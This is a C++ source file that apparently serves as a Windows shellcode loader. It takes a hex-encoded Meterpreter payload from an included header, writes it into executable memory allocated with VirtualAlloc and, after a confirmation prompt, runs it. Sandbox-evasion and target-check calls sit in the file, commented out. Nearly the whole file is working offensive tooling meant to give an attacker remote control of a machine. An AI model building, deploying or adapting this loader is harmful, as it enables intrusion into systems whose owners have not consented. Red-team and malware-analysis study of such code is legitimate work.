#include <cstdint>
#include <string>
#include <iostream>
#include <windows.h>

#include "sandbox.h"
#include "target.h"

#include "meterpreter.h"

//int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR lpCmdLine,
//		   int nCmdShow)
int main()
{
	//if (IsSandbox())
	//	return 0;

	//if (!IsTarget())
	//	return 0;

	char* shellcode_address = (char*)VirtualAlloc(NULL, sizeof(buf),
						MEM_RESERVE | MEM_COMMIT,
						PAGE_EXECUTE_READWRITE);

	// iterate every 3 bytes = 1 byte (2 hex chars = 1 byte)
	// write only 2
	// goto next
	size_t shellcode_index = 0;
	for (size_t i = 0; i < sizeof(buf); i += 3) {
		// convert 2 hex chars into single byte
		char hex_chars[3] = { buf[i], buf[i+1], '\0' };
		auto byte = std::strtoul(hex_chars, nullptr, 16);
		//printf("%x\n", byte);
		shellcode_address[shellcode_index] = byte;
		shellcode_index++;
	}

	std::cout << "Length: " << shellcode_index + 1 << std::endl;
	std::cout << "Execute: y?" << std::endl;

	char ans;
	std::cin >> ans;

	if (ans == 'y') {
		((void (*)())shellcode_address)();
	}

	return 0;
}

// For mingw to compile
//int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
//		    PWSTR pCmdLine, int nCmdShow)
//{
//	return 0;
//}
